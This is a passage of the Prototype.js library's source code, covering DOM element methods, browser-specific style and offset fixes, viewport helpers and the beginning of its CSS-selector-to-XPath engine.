    var args = $A(arguments), element = $(args.shift());
    return Selector.findChildElements(element, args);
  },

  adjacent: function() {
    var args = $A(arguments), element = $(args.shift());
    return Selector.findChildElements(element.parentNode, args).without(element);
  },

  identify: function(element) {
    element = $(element);
    var id = element.readAttribute('id'), self = arguments.callee;
    if (id) return id;
    do { id = 'anonymous_element_' + self.counter++ } while ($(id));
    element.writeAttribute('id', id);
    return id;
  },

  readAttribute: function(element, name) {
    element = $(element);
    if (Prototype.Browser.IE) {
      var t = Element._attributeTranslations.read;
      if (t.values[name]) return t.values[name](element, name);
      if (t.names[name]) name = t.names[name];
      if (name.include(':')) {
        return (!element.attributes || !element.attributes[name]) ? null :
         element.attributes[name].value;
      }
    }
    return element.getAttribute(name);
  },

  writeAttribute: function(element, name, value) {
    element = $(element);
    var attributes = { }, t = Element._attributeTranslations.write;

    if (typeof name == 'object') attributes = name;
    else attributes[name] = Object.isUndefined(value) ? true : value;

    for (var attr in attributes) {
      name = t.names[attr] || attr;
      value = attributes[attr];
      if (t.values[attr]) name = t.values[attr](element, value);
      if (value === false || value === null)
        element.removeAttribute(name);
      else if (value === true)
        element.setAttribute(name, name);
      else element.setAttribute(name, value);
    }
    return element;
  },

  getHeight: function(element) {
    return $(element).getDimensions().height;
  },

  getWidth: function(element) {
    return $(element).getDimensions().width;
  },

  classNames: function(element) {
    return new Element.ClassNames(element);
  },

  hasClassName: function(element, className) {
    if (!(element = $(element))) return;
    var elementClassName = element.className;
    return (elementClassName.length > 0 && (elementClassName == className ||
      new RegExp("(^|\\s)" + className + "(\\s|$)").test(elementClassName)));
  },

  addClassName: function(element, className) {
    if (!(element = $(element))) return;
    if (!element.hasClassName(className))
      element.className += (element.className ? ' ' : '') + className;
    return element;
  },

  removeClassName: function(element, className) {
    if (!(element = $(element))) return;
    element.className = element.className.replace(
      new RegExp("(^|\\s+)" + className + "(\\s+|$)"), ' ').strip();
    return element;
  },

  toggleClassName: function(element, className) {
    if (!(element = $(element))) return;
    return element[element.hasClassName(className) ?
      'removeClassName' : 'addClassName'](className);
  },

  // removes whitespace-only text node children
  cleanWhitespace: function(element) {
    element = $(element);
    var node = element.firstChild;
    while (node) {
      var nextNode = node.nextSibling;
      if (node.nodeType == 3 && !/\S/.test(node.nodeValue))
        element.removeChild(node);
      node = nextNode;
    }
    return element;
  },

  empty: function(element) {
    return $(element).innerHTML.blank();
  },

  descendantOf: function(element, ancestor) {
    element = $(element), ancestor = $(ancestor);

    if (element.compareDocumentPosition)
      return (element.compareDocumentPosition(ancestor) & 8) === 8;

    if (ancestor.contains)
      return ancestor.contains(element) && ancestor !== element;

    while (element = element.parentNode)
      if (element == ancestor) return true;

    return false;
  },

  scrollTo: function(element) {
    element = $(element);
    var pos = element.cumulativeOffset();
    window.scrollTo(pos[0], pos[1]);
    return element;
  },

  getStyle: function(element, style) {
    element = $(element);
    style = style == 'float' ? 'cssFloat' : style.camelize();
    var value = element.style[style];
    if (!value || value == 'auto') {
      var css = document.defaultView.getComputedStyle(element, null);
      value = css ? css[style] : null;
    }
    if (style == 'opacity') return value ? parseFloat(value) : 1.0;
    return value == 'auto' ? null : value;
  },

  getOpacity: function(element) {
    return $(element).getStyle('opacity');
  },

  setStyle: function(element, styles) {
    element = $(element);
    var elementStyle = element.style, match;
    if (Object.isString(styles)) {
      element.style.cssText += ';' + styles;
      return styles.include('opacity') ?
        element.setOpacity(styles.match(/opacity:\s*(\d?\.?\d*)/)[1]) : element;
    }
    for (var property in styles)
      if (property == 'opacity') element.setOpacity(styles[property]);
      else
        elementStyle[(property == 'float' || property == 'cssFloat') ?
          (Object.isUndefined(elementStyle.styleFloat) ? 'cssFloat' : 'styleFloat') :
            property] = styles[property];

    return element;
  },

  setOpacity: function(element, value) {
    element = $(element);
    element.style.opacity = (value == 1 || value === '') ? '' :
      (value < 0.00001) ? 0 : value;
    return element;
  },

  getDimensions: function(element) {
    element = $(element);
    var display = element.getStyle('display');
    if (display != 'none' && display != null) // Safari bug
      return {width: element.offsetWidth, height: element.offsetHeight};

    // All *Width and *Height properties give 0 on elements with display none,
    // so enable the element temporarily
    var els = element.style;
    var originalVisibility = els.visibility;
    var originalPosition = els.position;
    var originalDisplay = els.display;
    els.visibility = 'hidden';
    els.position = 'absolute';
    els.display = 'block';
    var originalWidth = element.clientWidth;
    var originalHeight = element.clientHeight;
    els.display = originalDisplay;
    els.position = originalPosition;
    els.visibility = originalVisibility;
    return {width: originalWidth, height: originalHeight};
  },

  makePositioned: function(element) {
    element = $(element);
    var pos = Element.getStyle(element, 'position');
    if (pos == 'static' || !pos) {
      element._madePositioned = true;
      element.style.position = 'relative';
      // Opera returns the offset relative to the positioning context, when an
      // element is position relative but top and left have not been defined
      if (Prototype.Browser.Opera) {
        element.style.top = 0;
        element.style.left = 0;
      }
    }
    return element;
  },

  undoPositioned: function(element) {
    element = $(element);
    if (element._madePositioned) {
      element._madePositioned = undefined;
      element.style.position =
        element.style.top =
        element.style.left =
        element.style.bottom =
        element.style.right = '';
    }
    return element;
  },

  makeClipping: function(element) {
    element = $(element);
    if (element._overflow) return element;
    element._overflow = Element.getStyle(element, 'overflow') || 'auto';
    if (element._overflow !== 'hidden')
      element.style.overflow = 'hidden';
    return element;
  },

  undoClipping: function(element) {
    element = $(element);
    if (!element._overflow) return element;
    element.style.overflow = element._overflow == 'auto' ? '' : element._overflow;
    element._overflow = null;
    return element;
  },

  cumulativeOffset: function(element) {
    var valueT = 0, valueL = 0;
    do {
      valueT += element.offsetTop  || 0;
      valueL += element.offsetLeft || 0;
      element = element.offsetParent;
    } while (element);
    return Element._returnOffset(valueL, valueT);
  },

  positionedOffset: function(element) {
    var valueT = 0, valueL = 0;
    do {
      valueT += element.offsetTop  || 0;
      valueL += element.offsetLeft || 0;
      element = element.offsetParent;
      if (element) {
        if (element.tagName.toUpperCase() == 'BODY') break;
        var p = Element.getStyle(element, 'position');
        if (p !== 'static') break;
      }
    } while (element);
    return Element._returnOffset(valueL, valueT);
  },

  absolutize: function(element) {
    element = $(element);
    if (element.getStyle('position') == 'absolute') return element;
    // Position.prepare(); // To be done manually by Scripty when it needs it.

    var offsets = element.positionedOffset();
    var top     = offsets[1];
    var left    = offsets[0];
    var width   = element.clientWidth;
    var height  = element.clientHeight;

    element._originalLeft   = left - parseFloat(element.style.left  || 0);
    element._originalTop    = top  - parseFloat(element.style.top || 0);
    element._originalWidth  = element.style.width;
    element._originalHeight = element.style.height;

    element.style.position = 'absolute';
    element.style.top    = top + 'px';
    element.style.left   = left + 'px';
    element.style.width  = width + 'px';
    element.style.height = height + 'px';
    return element;
  },

  relativize: function(element) {
    element = $(element);
    if (element.getStyle('position') == 'relative') return element;
    // Position.prepare(); // To be done manually by Scripty when it needs it.

    element.style.position = 'relative';
    var top  = parseFloat(element.style.top  || 0) - (element._originalTop || 0);
    var left = parseFloat(element.style.left || 0) - (element._originalLeft || 0);

    element.style.top    = top + 'px';
    element.style.left   = left + 'px';
    element.style.height = element._originalHeight;
    element.style.width  = element._originalWidth;
    return element;
  },

  cumulativeScrollOffset: function(element) {
    var valueT = 0, valueL = 0;
    do {
      valueT += element.scrollTop  || 0;
      valueL += element.scrollLeft || 0;
      element = element.parentNode;
    } while (element);
    return Element._returnOffset(valueL, valueT);
  },

  getOffsetParent: function(element) {
    if (element.offsetParent) return $(element.offsetParent);
    if (element == document.body) return $(element);
    if(element.tagName.toUpperCase()=='HTML') //for IE6,7
        return $(document.body);                //

    while ((element = element.parentNode) && element != document.body)
      if (Element.getStyle(element, 'position') != 'static')
        return $(element);

    return $(document.body);
  },

  viewportOffset: function(forElement) {
    var valueT = 0, valueL = 0;

    var element = forElement;
    do {
      valueT += element.offsetTop  || 0;
      valueL += element.offsetLeft || 0;

      // Safari fix
      if (element.offsetParent == document.body &&
        Element.getStyle(element, 'position') == 'absolute') break;

    } while (element = element.offsetParent);

    element = forElement;
    do {
      if (!Prototype.Browser.Opera || (element.tagName && (element.tagName.toUpperCase() == 'BODY'))) {
        valueT -= element.scrollTop  || 0;
        valueL -= element.scrollLeft || 0;
      }
    } while (element = element.parentNode);

    return Element._returnOffset(valueL, valueT);
  },

  clonePosition: function(element, source) {
    var options = Object.extend({
      setLeft:    true,
      setTop:     true,
      setWidth:   true,
      setHeight:  true,
      offsetTop:  0,
      offsetLeft: 0
    }, arguments[2] || { });

    // find page position of source
    source = $(source);
    var p = source.viewportOffset();

    // find coordinate system to use
    element = $(element);
    var delta = [0, 0];
    var parent = null;
    // delta [0,0] will do fine with position: fixed elements,
    // position:absolute needs offsetParent deltas
    if (Element.getStyle(element, 'position') == 'absolute') {
      parent = element.getOffsetParent();
      delta = parent.viewportOffset();
    }

    // correct by body offsets (fixes Safari)
    if (parent == document.body) {
      delta[0] -= document.body.offsetLeft;
      delta[1] -= document.body.offsetTop;
    }

    // set position
    if (options.setLeft)   element.style.left  = (p[0] - delta[0] + options.offsetLeft) + 'px';
    if (options.setTop)    element.style.top   = (p[1] - delta[1] + options.offsetTop) + 'px';
    if (options.setWidth)  element.style.width = source.offsetWidth + 'px';
    if (options.setHeight) element.style.height = source.offsetHeight + 'px';
    return element;
  }
};

Element.Methods.identify.counter = 1;

Object.extend(Element.Methods, {
  getElementsBySelector: Element.Methods.select,
  childElements: Element.Methods.immediateDescendants
});

Element._attributeTranslations = {
  write: {
    names: {
      className: 'class',
      htmlFor:   'for'
    },
    values: { }
  }
};

if (Prototype.Browser.Opera) {
  Element.Methods.getStyle = Element.Methods.getStyle.wrap(
    function(proceed, element, style) {
      switch (style) {
        case 'left': case 'top': case 'right': case 'bottom':
          if (proceed(element, 'position') === 'static') return null;
        case 'height': case 'width':
          // returns '0px' for hidden elements; we want it to return null
          if (!Element.visible(element)) return null;

          // returns the border-box dimensions rather than the content-box
          // dimensions, so we subtract padding and borders from the value
          var dim = parseInt(proceed(element, style), 10);

          if (dim !== element['offset' + style.capitalize()])
            return dim + 'px';

          var properties;
          if (style === 'height') {
            properties = ['border-top-width', 'padding-top',
             'padding-bottom', 'border-bottom-width'];
          }
          else {
            properties = ['border-left-width', 'padding-left',
             'padding-right', 'border-right-width'];
          }
          return properties.inject(dim, function(memo, property) {
            var val = proceed(element, property);
            return val === null ? memo : memo - parseInt(val, 10);
          }) + 'px';
        default: return proceed(element, style);
      }
    }
  );

  Element.Methods.readAttribute = Element.Methods.readAttribute.wrap(
    function(proceed, element, attribute) {
      if (attribute === 'title') return element.title;
      return proceed(element, attribute);
    }
  );
}

else if (Prototype.Browser.IE) {
  // IE doesn't report offsets correctly for static elements, so we change them
  // to "relative" to get the values, then change them back.
  Element.Methods.getOffsetParent = Element.Methods.getOffsetParent.wrap(
    function(proceed, element) {
      element = $(element);
      // IE throws an error if element is not in document
      try { element.offsetParent }
      catch(e) { return $(document.body) }
      var position = element.getStyle('position');
      if (position !== 'static') return proceed(element);
      element.setStyle({ position: 'relative' });
      var value = proceed(element);
      element.setStyle({ position: position });
      return value;
    }
  );

  $w('positionedOffset viewportOffset').each(function(method) {
    Element.Methods[method] = Element.Methods[method].wrap(
      function(proceed, element) {
        element = $(element);
        try { element.offsetParent }
        catch(e) { return Element._returnOffset(0,0) }
        var position = element.getStyle('position');
        if (position !== 'static') return proceed(element);
        // Trigger hasLayout on the offset parent so that IE6 reports
        // accurate offsetTop and offsetLeft values for position: fixed.
        var offsetParent = element.getOffsetParent();
        if (offsetParent && offsetParent.getStyle('position') === 'fixed')
          offsetParent.setStyle({ zoom: 1 });
        element.setStyle({ position: 'relative' });
        var value = proceed(element);
        element.setStyle({ position: position });
        return value;
      }
    );
  });

  Element.Methods.cumulativeOffset = Element.Methods.cumulativeOffset.wrap(
    function(proceed, element) {
      try { element.offsetParent }
      catch(e) { return Element._returnOffset(0,0) }
      return proceed(element);
    }
  );

  Element.Methods.getStyle = function(element, style) {
    element = $(element);
    style = (style == 'float' || style == 'cssFloat') ? 'styleFloat' : style.camelize();
    var value = element.style[style];
    if (!value && element.currentStyle) value = element.currentStyle[style];

    if (style == 'opacity') {
      if (value = (element.getStyle('filter') || '').match(/alpha\(opacity=(.*)\)/))
        if (value[1]) return parseFloat(value[1]) / 100;
      return 1.0;
    }

    if (value == 'auto') {
      if ((style == 'width' || style == 'height') && (element.getStyle('display') != 'none'))
        return element['offset' + style.capitalize()] + 'px';
      return null;
    }
    return value;
  };

  Element.Methods.setOpacity = function(element, value) {
    function stripAlpha(filter){
      return filter.replace(/alpha\([^\)]*\)/gi,'');
    }
    element = $(element);
    var currentStyle = element.currentStyle;
    if ((currentStyle && !currentStyle.hasLayout) ||
      (!currentStyle && element.style.zoom == 'normal'))
        element.style.zoom = 1;

    var filter = element.getStyle('filter'), style = element.style;
    if (value == 1 || value === '') {
      (filter = stripAlpha(filter)) ?
        style.filter = filter : style.removeAttribute('filter');
      return element;
    } else if (value < 0.00001) value = 0;
    style.filter = stripAlpha(filter) +
      'alpha(opacity=' + (value * 100) + ')';
    return element;
  };

  Element._attributeTranslations = {
    read: {
      names: {
        'class': 'className',
        'for':   'htmlFor'
      },
      values: {
        _getAttr: function(element, attribute) {
          return element.getAttribute(attribute, 2);
        },
        _getAttrNode: function(element, attribute) {
          var node = element.getAttributeNode(attribute);
          return node ? node.value : "";
        },
        _getEv: function(element, attribute) {
          attribute = element.getAttribute(attribute);
          return attribute ? attribute.toString().slice(23, -2) : null;
        },
        _flag: function(element, attribute) {
          return $(element).hasAttribute(attribute) ? attribute : null;
        },
        style: function(element) {
          return element.style.cssText.toLowerCase();
        },
        title: function(element) {
          return element.title;
        }
      }
    }
  };

  Element._attributeTranslations.write = {
    names: Object.extend({
      cellpadding: 'cellPadding',
      cellspacing: 'cellSpacing'
    }, Element._attributeTranslations.read.names),
    values: {
      checked: function(element, value) {
        element.checked = !!value;
      },

      style: function(element, value) {
        element.style.cssText = value ? value : '';
      }
    }
  };

  Element._attributeTranslations.has = {};

  $w('colSpan rowSpan vAlign dateTime accessKey tabIndex ' +
      'encType maxLength readOnly longDesc frameBorder').each(function(attr) {
    Element._attributeTranslations.write.names[attr.toLowerCase()] = attr;
    Element._attributeTranslations.has[attr.toLowerCase()] = attr;
  });

  (function(v) {
    Object.extend(v, {
      href:        v._getAttr,
      src:         v._getAttr,
      type:        v._getAttr,
      action:      v._getAttrNode,
      disabled:    v._flag,
      checked:     v._flag,
      readonly:    v._flag,
      multiple:    v._flag,
      onload:      v._getEv,
      onunload:    v._getEv,
      onclick:     v._getEv,
      ondblclick:  v._getEv,
      onmousedown: v._getEv,
      onmouseup:   v._getEv,
      onmouseover: v._getEv,
      onmousemove: v._getEv,
      onmouseout:  v._getEv,
      onfocus:     v._getEv,
      onblur:      v._getEv,
      onkeypress:  v._getEv,
      onkeydown:   v._getEv,
      onkeyup:     v._getEv,
      onsubmit:    v._getEv,
      onreset:     v._getEv,
      onselect:    v._getEv,
      onchange:    v._getEv
    });
  })(Element._attributeTranslations.read.values);
}

else if (Prototype.Browser.Gecko && /rv:1\.8\.0/.test(navigator.userAgent)) {
  Element.Methods.setOpacity = function(element, value) {
    element = $(element);
    element.style.opacity = (value == 1) ? 0.999999 :
      (value === '') ? '' : (value < 0.00001) ? 0 : value;
    return element;
  };
}

else if (Prototype.Browser.WebKit) {
  Element.Methods.setOpacity = function(element, value) {
    element = $(element);
    element.style.opacity = (value == 1 || value === '') ? '' :
      (value < 0.00001) ? 0 : value;

    if (value == 1)
      if(element.tagName.toUpperCase() == 'IMG' && element.width) {
        element.width++; element.width--;
      } else try {
        var n = document.createTextNode(' ');
        element.appendChild(n);
        element.removeChild(n);
      } catch (e) { }

    return element;
  };

  // Safari returns margins on body which is incorrect if the child is absolutely
  // positioned.  For performance reasons, redefine Element#cumulativeOffset for
  // KHTML/WebKit only.
  Element.Methods.cumulativeOffset = function(element) {
    var valueT = 0, valueL = 0;
    do {
      valueT += element.offsetTop  || 0;
      valueL += element.offsetLeft || 0;
      if (element.offsetParent == document.body)
        if (Element.getStyle(element, 'position') == 'absolute') break;

      element = element.offsetParent;
    } while (element);

    return Element._returnOffset(valueL, valueT);
  };
}

if (Prototype.Browser.IE || Prototype.Browser.Opera) {
  // IE and Opera are missing .innerHTML support for TABLE-related and SELECT elements
  Element.Methods.update = function(element, content) {
    element = $(element);

    if (content && content.toElement) content = content.toElement();
    if (Object.isElement(content)) return element.update().insert(content);

    content = Object.toHTML(content);
    var tagName = element.tagName.toUpperCase();

    if (tagName in Element._insertionTranslations.tags) {
      $A(element.childNodes).each(function(node) { element.removeChild(node) });
      Element._getContentFromAnonymousElement(tagName, content.stripScripts())
        .each(function(node) { element.appendChild(node) });
    }
    else element.innerHTML = content.stripScripts();

    content.evalScripts.bind(content).defer();
    return element;
  };
}

if ('outerHTML' in document.createElement('div')) {
  Element.Methods.replace = function(element, content) {
    element = $(element);

    if (content && content.toElement) content = content.toElement();
    if (Object.isElement(content)) {
      element.parentNode.replaceChild(content, element);
      return element;
    }

    content = Object.toHTML(content);
    var parent = element.parentNode, tagName = parent.tagName.toUpperCase();

    if (Element._insertionTranslations.tags[tagName]) {
      var nextSibling = element.next();
      var fragments = Element._getContentFromAnonymousElement(tagName, content.stripScripts());
      parent.removeChild(element);
      if (nextSibling)
        fragments.each(function(node) { parent.insertBefore(node, nextSibling) });
      else
        fragments.each(function(node) { parent.appendChild(node) });
    }
    else element.outerHTML = content.stripScripts();

    content.evalScripts.bind(content).defer();
    return element;
  };
}

Element._returnOffset = function(l, t) {
  var result = [l, t];
  result.left = l;
  result.top = t;
  return result;
};

Element._getContentFromAnonymousElement = function(tagName, html) {
  var div = new Element('div'), t = Element._insertionTranslations.tags[tagName];
  if (t) {
    div.innerHTML = t[0] + html + t[1];
    t[2].times(function() { div = div.firstChild });
  } else div.innerHTML = html;
  return $A(div.childNodes);
};

Element._insertionTranslations = {
  before: function(element, node) {
    element.parentNode.insertBefore(node, element);
  },
  top: function(element, node) {
    element.insertBefore(node, element.firstChild);
  },
  bottom: function(element, node) {
    element.appendChild(node);
  },
  after: function(element, node) {
    element.parentNode.insertBefore(node, element.nextSibling);
  },
  tags: {
    TABLE:  ['<table>',                '</table>',                   1],
    TBODY:  ['<table><tbody>',         '</tbody></table>',           2],
    TR:     ['<table><tbody><tr>',     '</tr></tbody></table>',      3],
    TD:     ['<table><tbody><tr><td>', '</td></tr></tbody></table>', 4],
    SELECT: ['<select>',               '</select>',                  1]
  }
};

(function() {
  Object.extend(this.tags, {
    THEAD: this.tags.TBODY,
    TFOOT: this.tags.TBODY,
    TH:    this.tags.TD
  });
}).call(Element._insertionTranslations);

Element.Methods.Simulated = {
  hasAttribute: function(element, attribute) {
    attribute = Element._attributeTranslations.has[attribute] || attribute;
    var node = $(element).getAttributeNode(attribute);
    return !!(node && node.specified);
  }
};

Element.Methods.ByTag = { };

Object.extend(Element, Element.Methods);

if (!Prototype.BrowserFeatures.ElementExtensions &&
    document.createElement('div')['__proto__']) {
  window.HTMLElement = { };
  window.HTMLElement.prototype = document.createElement('div')['__proto__'];
  Prototype.BrowserFeatures.ElementExtensions = true;
}

Element.extend = (function() {
  if (Prototype.BrowserFeatures.SpecificElementExtensions)
    return Prototype.K;

  var Methods = { }, ByTag = Element.Methods.ByTag;

  var extend = Object.extend(function(element) {
    if (!element || element._extendedByPrototype ||
        element.nodeType != 1 || element == window) return element;

    var methods = Object.clone(Methods),
      tagName = element.tagName.toUpperCase(), property, value;

    // extend methods for specific tags
    if (ByTag[tagName]) Object.extend(methods, ByTag[tagName]);

    for (property in methods) {
      value = methods[property];
      if (Object.isFunction(value) && !(property in element))
        element[property] = value.methodize();
    }

    element._extendedByPrototype = Prototype.emptyFunction;
    return element;

  }, {
    refresh: function() {
      // extend methods for all tags (Safari doesn't need this)
      if (!Prototype.BrowserFeatures.ElementExtensions) {
        Object.extend(Methods, Element.Methods);
        Object.extend(Methods, Element.Methods.Simulated);
      }
    }
  });

  extend.refresh();
  return extend;
})();

Element.hasAttribute = function(element, attribute) {
  if (element.hasAttribute) return element.hasAttribute(attribute);
  return Element.Methods.Simulated.hasAttribute(element, attribute);
};

Element.addMethods = function(methods) {
  var F = Prototype.BrowserFeatures, T = Element.Methods.ByTag;

  if (!methods) {
    Object.extend(Form, Form.Methods);
    Object.extend(Form.Element, Form.Element.Methods);
    Object.extend(Element.Methods.ByTag, {
      "FORM":     Object.clone(Form.Methods),
      "INPUT":    Object.clone(Form.Element.Methods),
      "SELECT":   Object.clone(Form.Element.Methods),
      "TEXTAREA": Object.clone(Form.Element.Methods)
    });
  }

  if (arguments.length == 2) {
    var tagName = methods;
    methods = arguments[1];
  }

  if (!tagName) Object.extend(Element.Methods, methods || { });
  else {
    if (Object.isArray(tagName)) tagName.each(extend);
    else extend(tagName);
  }

  function extend(tagName) {
    tagName = tagName.toUpperCase();
    if (!Element.Methods.ByTag[tagName])
      Element.Methods.ByTag[tagName] = { };
    Object.extend(Element.Methods.ByTag[tagName], methods);
  }

  function copy(methods, destination, onlyIfAbsent) {
    onlyIfAbsent = onlyIfAbsent || false;
    for (var property in methods) {
      var value = methods[property];
      if (!Object.isFunction(value)) continue;
      if (!onlyIfAbsent || !(property in destination))
        destination[property] = value.methodize();
    }
  }

  function findDOMClass(tagName) {
    var klass;
    var trans = {
      "OPTGROUP": "OptGroup", "TEXTAREA": "TextArea", "P": "Paragraph",
      "FIELDSET": "FieldSet", "UL": "UList", "OL": "OList", "DL": "DList",
      "DIR": "Directory", "H1": "Heading", "H2": "Heading", "H3": "Heading",
      "H4": "Heading", "H5": "Heading", "H6": "Heading", "Q": "Quote",
      "INS": "Mod", "DEL": "Mod", "A": "Anchor", "IMG": "Image", "CAPTION":
      "TableCaption", "COL": "TableCol", "COLGROUP": "TableCol", "THEAD":
      "TableSection", "TFOOT": "TableSection", "TBODY": "TableSection", "TR":
      "TableRow", "TH": "TableCell", "TD": "TableCell", "FRAMESET":
      "FrameSet", "IFRAME": "IFrame"
    };
    if (trans[tagName]) klass = 'HTML' + trans[tagName] + 'Element';
    if (window[klass]) return window[klass];
    klass = 'HTML' + tagName + 'Element';
    if (window[klass]) return window[klass];
    klass = 'HTML' + tagName.capitalize() + 'Element';
    if (window[klass]) return window[klass];

    window[klass] = { };
    window[klass].prototype = document.createElement(tagName)['__proto__'];
    return window[klass];
  }

  if (F.ElementExtensions) {
    copy(Element.Methods, HTMLElement.prototype);
    copy(Element.Methods.Simulated, HTMLElement.prototype, true);
  }

  if (F.SpecificElementExtensions) {
    for (var tag in Element.Methods.ByTag) {
      var klass = findDOMClass(tag);
      if (Object.isUndefined(klass)) continue;
      copy(T[tag], klass.prototype);
    }
  }

  Object.extend(Element, Element.Methods);
  delete Element.ByTag;

  if (Element.extend.refresh) Element.extend.refresh();
  Element.cache = { };
};

document.viewport = {
  getDimensions: function() {
    var dimensions = { }, B = Prototype.Browser;
    $w('width height').each(function(d) {
      var D = d.capitalize();
      if (B.WebKit && !document.evaluate) {
        // Safari <3.0 needs self.innerWidth/Height
        dimensions[d] = self['inner' + D];
      } else if (B.Opera && parseFloat(window.opera.version()) < 9.5) {
        // Opera <9.5 needs document.body.clientWidth/Height
        dimensions[d] = document.body['client' + D]
      } else {
        dimensions[d] = document.documentElement['client' + D];
      }
    });
    return dimensions;
  },

  getWidth: function() {
    return this.getDimensions().width;
  },

  getHeight: function() {
    return this.getDimensions().height;
  },

  getScrollOffsets: function() {
    return Element._returnOffset(
      window.pageXOffset || document.documentElement.scrollLeft || document.body.scrollLeft,
      window.pageYOffset || document.documentElement.scrollTop || document.body.scrollTop);
  }
};
/* Portions of the Selector class are derived from Jack Slocum's DomQuery,
 * part of YUI-Ext version 0.40, distributed under the terms of an MIT-style
 * license.  Please see http://www.yui-ext.com/ for more information. */

var Selector = Class.create({
  initialize: function(expression) {
    this.expression = expression.strip();

    if (this.shouldUseSelectorsAPI()) {
      this.mode = 'selectorsAPI';
    } else if (this.shouldUseXPath()) {
      this.mode = 'xpath';
      this.compileXPathMatcher();
    } else {
      this.mode = "normal";
      this.compileMatcher();
    }

  },

  shouldUseXPath: function() {
    if (!Prototype.BrowserFeatures.XPath) return false;

    var e = this.expression;

    // Safari 3 chokes on :*-of-type and :empty
    if (Prototype.Browser.WebKit &&
     (e.include("-of-type") || e.include(":empty")))
      return false;

    // XPath can't do namespaced attributes, nor can it read
    // the "checked" property from DOM nodes
    if ((/(\[[\w-]*?:|:checked)/).test(e))
      return false;

    return true;
  },

  shouldUseSelectorsAPI: function() {
    if (!Prototype.BrowserFeatures.SelectorsAPI) return false;

    if (!Selector._div) Selector._div = new Element('div');

    // Make sure the browser treats the selector as valid. Test on an
    // isolated element to minimize cost of this check.
    try {
      Selector._div.querySelector(this.expression);
    } catch(e) {
      return false;
    }

    return true;
  },

  compileMatcher: function() {
    var e = this.expression, ps = Selector.patterns, h = Selector.handlers,
        c = Selector.criteria, le, p, m;

    if (Selector._cache[e]) {
      this.matcher = Selector._cache[e];
      return;
    }

    this.matcher = ["this.matcher = function(root) {",
                    "var r = root, h = Selector.handlers, c = false, n;"];

    while (e && le != e && (/\S/).test(e)) {
      le = e;
      for (var i in ps) {
        p = ps[i];
        if (m = e.match(p)) {
          this.matcher.push(Object.isFunction(c[i]) ? c[i](m) :
            new Template(c[i]).evaluate(m));
          e = e.replace(m[0], '');
          break;
        }
      }
    }

    this.matcher.push("return h.unique(n);\n}");
    eval(this.matcher.join('\n'));
    Selector._cache[this.expression] = this.matcher;
  },

  compileXPathMatcher: function() {
    var e = this.expression, ps = Selector.patterns,
        x = Selector.xpath, le, m;

    if (Selector._cache[e]) {
      this.xpath = Selector._cache[e]; return;
    }

    this.matcher = ['.//*'];
    while (e && le != e && (/\S/).test(e)) {
      le = e;
      for (var i in ps) {
        if (m = e.match(ps[i])) {
          this.matcher.push(Object.isFunction(x[i]) ? x[i](m) :
            new Template(x[i]).evaluate(m));
          e = e.replace(m[0], '');
          break;
        }
      }
    }

    this.xpath = this.matcher.join('');
    Selector._cache[this.expression] = this.xpath;
  },

  findElements: function(root) {
    root = root || document;
    var e = this.expression, results;

    switch (this.mode) {
      case 'selectorsAPI':
        // querySelectorAll queries document-wide, then filters to descendants
        // of the context element. That's not what we want.
        // Add an explicit context to the selector if necessary.
        if (root !== document) {
          var oldId = root.id, id = $(root).identify();
          e = "#" + id + " " + e;
        }

        results = $A(root.querySelectorAll(e)).map(Element.extend);
        root.id = oldId;

        return results;
      case 'xpath':
        return document._getElementsByXPath(this.xpath, root);
      default:
       return this.matcher(root);
    }
  },

  match: function(element) {
    this.tokens = [];

    var e = this.expression, ps = Selector.patterns, as = Selector.assertions;
    var le, p, m;

    while (e && le !== e && (/\S/).test(e)) {
      le = e;
      for (var i in ps) {
        p = ps[i];
        if (m = e.match(p)) {
          // use the Selector.assertions methods unless the selector
          // is too complex.
          if (as[i]) {
            this.tokens.push([i, Object.clone(m)]);
            e = e.replace(m[0], '');
          } else {
            // reluctantly do a document-wide search
            // and look for a match in the array
            return this.findElements(document).include(element);
          }
        }
      }
    }

    var match = true, name, matches;
    for (var i = 0, token; token = this.tokens[i]; i++) {
      name = token[0], matches = token[1];
      if (!Selector.assertions[name](element, matches)) {
        match = false; break;
      }
    }

    return match;
  },

  toString: function() {
    return this.expression;
  },

  inspect: function() {
    return "#<Selector:" + this.expression.inspect() + ">";
  }
});

Object.extend(Selector, {
  _cache: { },

  xpath: {
    descendant:   "//*",
    child:        "/*",
    adjacent:     "/following-sibling::*[1]",
    laterSibling: '/following-sibling::*',
    tagName:      function(m) {
      if (m[1] == '*') return '';
      return "[local-name()='" + m[1].toLowerCase() +
             "' or local-name()='" + m[1].toUpperCase() + "']";
    },
    className:    "[contains(concat(' ', @class, ' '), ' #{1} ')]",
    id:           "[@id='#{1}']",
    attrPresence: function(m) {
      m[1] = m[1].toLowerCase();
      return new Template("[@#{1}]").evaluate(m);
    },
    attr: function(m) {
      m[1] = m[1].toLowerCase();
      m[3] = m[5] || m[6];
      return new Template(Selector.xpath.operators[m[2]]).evaluate(m);
    },
    pseudo: function(m) {
      var h = Selector.xpath.pseudos[m[1]];
      if (!h) return '';
      if (Object.isFunction(h)) return h(m);
      return new Template(Selector.xpath.pseudos[m[1]]).evaluate(m);
    },
    operators: {
      '=':  "[@#{1}='#{3}']",
      '!=': "[@#{1}!='#{3}']",
      '^=': "[starts-with(@#{1}, '#{3}')]",
      '$=': "[substring(@#{1}, (string-length(@#{1}) - string-length('#{3}') + 1))='#{3}']",
      '*=': "[contains(@#{1}, '#{3}')]",
      '~=': "[contains(concat(' ', @#{1}, ' '), ' #{3} ')]",
      '|=': "[contains(concat('-', @#{1}, '-'), '-#{3}-')]"
    },
    pseudos: {
      'first-child': '[not(preceding-sibling::*)]',
      'last-child':  '[not(following-sibling::*)]',
      'only-child':  '[not(preceding-sibling::* or following-sibling::*)]',
      'empty':       "[count(*) = 0 and (count(text()) = 0)]",
      'checked':     "[@checked]",
      'disabled':    "[(@disabled) and (@type!='hidden')]",
      'enabled':     "[not(@disabled) and (@type!='hidden')]",
      'not': function(m) {
        var e = m[6], p = Selector.patterns,
            x = Selector.xpath, le, v;

        var exclusion = [];
        while (e && le != e && (/\S/).test(e)) {
          le = e;
          for (var i in p) {
            if (m = e.match(p[i])) {
              v = Object.isFunction(x[i]) ? x[i](m) : new Template(x[i]).evaluate(m);
              exclusion.push("(" + v.substring(1, v.length - 1) + ")");
              e = e.replace(m[0], '');
              break;
            }
          }
        }
        return "[not(" + exclusion.join(" and ") + ")]";
      },
      'nth-child':      function(m) {
        return Selector.xpath.pseudos.nth("(count(./preceding-sibling::*) + 1) ", m);
      },
      'nth-last-child': function(m) {
        return Selector.xpath.pseudos.nth("(count(./following-sibling::*) + 1) ", m);
      },
